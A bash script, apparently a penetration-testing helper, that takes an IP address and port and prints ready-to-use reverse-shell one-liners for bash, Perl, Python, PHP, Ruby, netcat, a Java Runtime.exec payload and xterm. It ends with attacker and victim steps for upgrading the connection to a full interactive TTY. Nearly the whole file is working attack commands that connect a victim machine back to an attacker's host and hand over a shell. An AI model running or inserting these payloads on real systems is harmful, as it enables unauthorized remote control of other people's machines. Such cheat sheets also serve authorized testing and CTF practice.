#!/bin/bash

IP=$1
PORT=$2
          echo -e "\e[31mBASH:\n\e[0m\e[92mbash -i >& /dev/tcp/$IP/$PORT 0>&1\e[0m"
          echo -e "\e[31mPERL:\n\e[0m\e[92mperl -e 'use Socket;\$i=\"$IP\";\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\e[0m"
          echo -e "\e[31mPYTHON:\n\e[0m\e[92mpython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\e[0m"
          echo -e "\e[31mPHP:\n\e[0m\e[92mphp -r '\$sock=fsockopen(\"$IP\",$PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\e[0m"
          echo -e "\e[31mRUBY:\n\e[0m\e[92mruby -rsocket -e'f=TCPSocket.open(\"$IP\",$PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'\e[0m"
          echo -e "\e[31mNETCAT:\n\e[0m1)\e[92mnc -e /bin/sh $IP $PORT\e[0m"
          echo -e "2)\e[92mrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f\e[0m"
          echo -e "\e[31mPAYLOAD:\e[0m \n\e[92mr = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$IP/$PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])\np.waitFor()\e[0m"
          echo -e "\e[31mPAYLOAD:\e[0m \n\e[92mxterm -display $IP:1\e[0m"
          echo "To catch the incoming xterm, start an X-Server"
          echo -e "\e[92mXnest :1\e[0m"
          echo "You’ll need to authorise the target to connect to you (command also run on your host):"
          echo -e "\e[92mxhost +$IP\e[0m"
          echo
          echo
          echo -e "\e[31m============= FULL TTY ============\e[0m"
          echo -e "\e[31mAttacker. In system shell(prepare listener)\e[0m"
          echo -e "\e[92mrlwrap -r -f . nc -lnvp 8080\e[0m"
          echo -e "\e[31mVictim (execute reverse)\e[0m"
          echo -e "\e[92mbash -i >& /dev/tcp/$IP/$PORT 0>&1\e[0m"
          echo -e "\e[31mAttacker. In reverse shell (suspend foreground process)\e[0m"
          echo -e "\e[92mCTRL+Z\e[0m"
          echo -e "\e[31mAttacker In system shell (disable echo and send job to foregroung. You will be returned to revshell)\e[0m"
          echo -e "\e[92mstty raw -echo\e[0m"
          echo -e "\e[92mfg\e[0m"
          echo -e "\e[31mAttacker. In reverse shell\e[0m"
          echo -e "\e[92mreset\e[0m"
          echo -e "\e[92mexport SHELL=bash\e[0m"
          echo -e "\e[92mexport TERM=xterm-256color\e[0m"
          echo "... any command, now ctrl+c does work"
